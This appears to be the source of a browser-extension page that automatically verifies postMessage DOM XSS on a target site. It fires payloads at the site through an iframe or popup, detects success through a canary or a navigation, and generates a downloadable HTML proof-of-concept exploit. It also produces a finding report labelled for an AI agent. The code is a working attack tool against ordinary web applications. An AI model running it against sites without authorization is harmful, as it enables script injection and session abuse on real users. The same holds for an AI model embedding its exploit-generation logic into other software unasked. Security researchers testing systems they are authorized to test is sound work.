// verify.js — postMessage XSS verification engine

(function () {
  "use strict";

  const params = new URLSearchParams(location.search);
  const VERIFY_ID = params.get("id");
  if (!VERIFY_ID) { document.getElementById("status").textContent = "Missing verify ID"; return; }

  // UI elements
  const elStatus   = document.getElementById("status");
  const elLog      = document.getElementById("log");
  const elDots     = document.getElementById("dots");
  const elTarget   = document.getElementById("targetUrl");
  const elArea     = document.getElementById("target-area");
  const elResult   = document.getElementById("result");
  const elResTitle = document.getElementById("result-title");
  const elResDet   = document.getElementById("result-detail");
  const elPocCode  = document.getElementById("poc-code");
  const btnPoc     = document.getElementById("btn-poc");
  const btnClose   = document.getElementById("btn-close");

  let confirmed = false;
  let confirmedIndex = -1;
  let job = null;

  // --- port for instant canary notifications ---
  const port = chrome.runtime.connect({ name: "verify:" + VERIFY_ID });
  port.onMessage.addListener((msg) => {
    if (msg.type === "confirmed" && !confirmed) {
      confirmed = true;
      confirmedIndex = msg.payloadIndex || 0;
    }
  });

  function log(text, cls) {
    const span = document.createElement("span");
    span.className = cls || "";
    span.textContent = text + "\n";
    elLog.appendChild(span);
    elLog.scrollTop = elLog.scrollHeight;
  }

  function setStatus(text, cls) {
    elStatus.textContent = text;
    elStatus.className = "status-main " + (cls || "testing");
  }

  function delay(ms) { return new Promise((r) => setTimeout(r, ms)); }

  function send(msg) { return new Promise((r) => chrome.runtime.sendMessage(msg, r)); }

  // --- main flow ---
  async function run() {
    // 1) fetch job details from background
    const resp = await send({ type: "getVerifyJob", verifyId: VERIFY_ID });
    if (!resp || !resp.ok) { setStatus("Job not found", "failed"); log("Could not load verification job.", "err"); return; }
    job = resp.job;

    elTarget.textContent = job.targetUrl;
    log("Target: " + job.targetUrl, "hl");
    log("Payloads to test: " + job.payloads.length);
    log("");

    // create progress dots
    for (let i = 0; i < job.payloads.length; i++) {
      const d = document.createElement("div");
      d.className = "dot";
      d.title = job.payloads[i].description;
      elDots.appendChild(d);
    }

    // 2) try iframe approach
    log("═══ Phase 1: iframe approach ═══", "hl");
    const iframeResult = await tryMethod("iframe", job.targetUrl, job.payloads);

    if (confirmed) { finish(true); return; }

    // 3) try window.open approach
    log("");
    log("═══ Phase 2: window.open approach ═══", "hl");
    log("(handles X-Frame-Options / frame-ancestors blocks)");
    const winResult = await tryMethod("window", job.targetUrl, job.payloads);

    finish(confirmed);
  }

  async function tryMethod(method, url, payloads) {
    let target = null;

    if (method === "iframe") {
      elArea.classList.remove("hidden");
      const iframe = document.createElement("iframe");
      iframe.src = url;
      iframe.setAttribute("sandbox", "allow-scripts allow-same-origin allow-forms");
      elArea.appendChild(iframe);
      log("Loading iframe…");
      await raceLoad(iframe, 6000);
      log("Iframe loaded (or timed out). Sending payloads…");
      target = iframe.contentWindow;
    } else {
      log("Opening target in new window…");
      target = window.open(url, "_blank", "width=800,height=600");
      if (!target) { log("Popup blocked! Allow popups for this extension page and retry.", "err"); return; }
      await delay(4000); // wait for full page load + script execution
      log("Window opened. Sending payloads…");
    }

    for (let i = 0; i < payloads.length; i++) {
      if (confirmed) break;
      const p = payloads[i];
      setStatus(`Testing ${i + 1}/${payloads.length} (${method})…`);

      // tell background which index we're on
      chrome.runtime.sendMessage({ type: "verifyProgress", verifyId: VERIFY_ID, index: i });

      try {
        target.postMessage(p.data, p.targetOrigin);
        log("  [" + (i + 1) + "] " + p.description);
      } catch (e) {
        log("  [" + (i + 1) + "] SEND FAILED: " + e.message, "err");
      }

      // mark dot
      const dots = elDots.children;
      if (dots[i]) dots[i].className = "dot tried";

      // wait for canary or navigation
      await delay(700);

      // For location sinks: if the target navigated away, the canary fires
      // inside the javascript: URI context but the page is gone. Detect by
      // checking if we lost access to the target window (it navigated).
      if (!confirmed && method === "iframe") {
        try {
          // If iframe navigated to javascript: URI, its location changes
          // but we can't read it cross-origin. Check if content is gone.
          void target.postMessage; // access check — throws if detached
        } catch (navErr) {
          // target detached = it navigated = our payload triggered location.href
          confirmed = true;
          confirmedIndex = i;
          if (dots[i]) dots[i].className = "dot hit";
          log("  ✓ TARGET NAVIGATED on payload " + (i + 1) + " — location sink triggered", "ok");
          break;
        }
      }

      if (!confirmed && method === "window") {
        try {
          // For window.open targets: if javascript: URI executed, the canary
          // should fire. But if it was an http: redirect, the window navigated
          // to a new origin. Check if window is closed or location changed.
          if (target.closed) {
            log("  ⚠ Target window closed after payload " + (i + 1), "hl");
          }
        } catch (e) {}
      }

      // check for confirmation (port message may have arrived)
      if (confirmed) {
        if (dots[i]) dots[i].className = "dot hit";
        confirmedIndex = i;
        log("  ✓ CANARY FIRED on payload " + (i + 1), "ok");
        break;
      }
    }

    // grace period — some handlers defer execution
    if (!confirmed) {
      log("Waiting 3s grace period…");
      await delay(3000);
    }

    // cleanup
    if (method === "window" && target && !target.closed) {
      try { target.close(); } catch (e) {}
    }
  }

  function raceLoad(iframe, timeout) {
    return new Promise((resolve) => {
      let done = false;
      iframe.addEventListener("load", () => { if (!done) { done = true; resolve(); } });
      setTimeout(() => { if (!done) { done = true; resolve(); } }, timeout);
    });
  }

  function finish(success) {
    elResult.classList.remove("hidden");
    if (success) {
      setStatus("XSS CONFIRMED", "confirmed");
      elResTitle.textContent = "✓ Cross-origin DOM XSS confirmed";
      elResTitle.style.color = "var(--safe)";
      const p = job.payloads[confirmedIndex] || job.payloads[0];
      elResDet.innerHTML =
        '<div style="color:var(--muted);margin-bottom:8px">Successful payload (' + esc(p.description) + '):</div>' +
        '<pre class="poc">' + esc(JSON.stringify(p.data, null, 2)) + '</pre>' +
        '<div style="color:var(--muted);margin-top:8px">targetOrigin: ' + esc(p.targetOrigin) + '</div>';
      elPocCode.classList.remove("hidden");
      elPocCode.textContent = buildPoC(job.targetUrl, p);
      btnPoc.classList.remove("hidden");
      btnPoc.onclick = () => downloadPoC(job.targetUrl, p);
      log("\n★ CONFIRMED — cross-origin XSS is exploitable.", "ok");
      addDocButton("confirmed", p);
    } else {
      setStatus("NOT CONFIRMED", "failed");
      elResTitle.textContent = "✗ XSS not confirmed automatically";
      elResTitle.style.color = "var(--danger)";
      elResDet.innerHTML =
        '<div style="color:var(--muted)">Possible reasons:</div>' +
        '<div style="color:var(--ink);margin-top:6px">' +
        '• CSP blocks inline event handlers<br>' +
        '• X-Frame-Options / frame-ancestors blocked the iframe AND popup was blocked<br>' +
        '• Handler sanitizes input before reaching the sink<br>' +
        '• Payload shape doesn\'t match what the handler expects<br>' +
        '• SameSite cookies prevented authenticated page load</div>' +
        '<div style="color:var(--muted);margin-top:10px">Try manually with the console probe from the analysis, or adjust the payload shape.</div>';
      const p = job.payloads[0];
      if (p) {
        elPocCode.classList.remove("hidden");
        elPocCode.textContent = buildPoC(job.targetUrl, p);
        btnPoc.classList.remove("hidden");
        btnPoc.onclick = () => downloadPoC(job.targetUrl, p);
      }
      log("\n✗ No canary detected. See possible reasons above.", "err");
      addDocButton("not_confirmed", p);
    }
  }

  // --- Document for AI Agent ---
  function addDocButton(verifyResult, payload) {
    const btn = document.createElement("button");
    btn.className = "primary";
    btn.textContent = "📄 Document for AI Agent";
    btn.style.marginTop = "10px";
    btn.onclick = async () => {
      btn.textContent = "Generating…"; btn.disabled = true;
      const pocHtml = payload ? buildPoC(job.targetUrl, payload) : null;
      const resp = await send({
        type: "generateDoc",
        record: job.record,
        analysis: job.analysis,
        verifyResult: verifyResult,
        pocHtml: pocHtml
      });
      btn.textContent = "📄 Document for AI Agent"; btn.disabled = false;
      if (resp && resp.ok) {
        const blob = new Blob([resp.markdown], { type: "text/markdown" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        const host = new URL(job.targetUrl).hostname.replace(/\./g, "_");
        a.download = "finding_" + host + "_" + new Date().toISOString().slice(0, 10) + ".md";
        a.click();
        URL.revokeObjectURL(url);
      }
    };
    document.querySelector(".actions").appendChild(btn);
  }

  // --- PoC HTML generation ---
  function buildPoC(targetUrl, payload) {
    // For the downloadable PoC, replace our canary with alert(document.domain)
    const alertPayload = JSON.stringify(replaceCanary(payload.data), null, 4);
    return `<!DOCTYPE html>
<html>
<head>
  <title>postMessage XSS PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #ccc; padding: 20px; }
    h1 { color: #e5484d; font-size: 18px; }
    pre { background: #1a1a2e; padding: 12px; border-radius: 6px; overflow: auto; }
    .warn { color: #e0a340; font-size: 13px; margin-bottom: 16px; }
  </style>
</head>
<body>
  <h1>postMessage DOM XSS — Proof of Concept</h1>
  <div class="warn">⚠ For authorized security testing only. Generated by postMessage Mapper.</div>
  <p>Target: <code>${esc(targetUrl)}</code></p>
  <p>Payload:</p>
  <pre>${esc(alertPayload)}</pre>

  <h2>Method 1: iframe</h2>
  <iframe id="t" src="${esc(targetUrl)}" style="width:100%;height:300px;border:1px solid #333"></iframe>

  <h2>Method 2: window.open (if iframe blocked)</h2>
  <button onclick="tryWindowOpen()">Open target in new window</button>

  <script>
    var PAYLOAD = ${alertPayload};

    // iframe method
    document.getElementById("t").onload = function() {
      setTimeout(function() {
        this.contentWindow.postMessage(PAYLOAD, "${esc(payload.targetOrigin)}");
      }.bind(this), 1500);
    };

    // window.open method
    function tryWindowOpen() {
      var w = window.open("${esc(targetUrl)}");
      setTimeout(function() {
        w.postMessage(PAYLOAD, "${esc(payload.targetOrigin)}");
      }, 3000);
    }
  </script>
</body>
</html>`;
  }

  function replaceCanary(data) {
    if (data === null || data === undefined) return data;
    if (typeof data === "string") {
      // Find any javascript: URI containing our canary markers (even inside JSON strings)
      // and replace the ENTIRE URI with alert(document.domain) + optional //http: suffix
      data = data.replace(
        /javascript:[^"]*?(?:__pmm_verify_|__pmm_xss_ok|dispatchEvent)[^"]*/g,
        function (match) {
          var suffix = "";
          var sm = match.match(/(\/\/https?:.*)$/);
          if (sm) suffix = sm[1];
          return "javascript:alert(document.domain)" + suffix;
        }
      );
      // Also handle top-level javascript: URIs without markers (shouldn't happen but safe)
      if (/^javascript:/i.test(data) && !data.includes("alert")) {
        var suffixMatch = data.match(/(\/\/https?:.*)$/);
        var suffix = suffixMatch ? suffixMatch[1] : "";
        return "javascript:alert(document.domain)" + suffix;
      }
      // Clean up event-based canaries in HTML contexts
      data = data
        .replace(/window\.dispatchEvent\(new CustomEvent\('__pmm_xss_ok',\{detail:'[^']*'\}\)\)/g, "alert(document.domain)")
        .replace(/__pmm_xss_ok/g, "")
        .replace(/__pmm_verify_[a-z0-9]+/g, "");
      return data;
    }
    if (Array.isArray(data)) return data.map(replaceCanary);
    if (typeof data === "object") {
      const out = {};
      for (const k of Object.keys(data)) out[k] = replaceCanary(data[k]);
      return out;
    }
    return data;
  }

  function downloadPoC(targetUrl, payload) {
    const html = buildPoC(targetUrl, payload);
    const blob = new Blob([html], { type: "text/html" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    const host = new URL(targetUrl).hostname.replace(/\./g, "_");
    a.download = "poc_postmessage_xss_" + host + ".html";
    a.click();
    URL.revokeObjectURL(url);
  }

  function esc(s) { return String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"); }

  btnClose.onclick = () => window.close();

  // go
  run();
})();
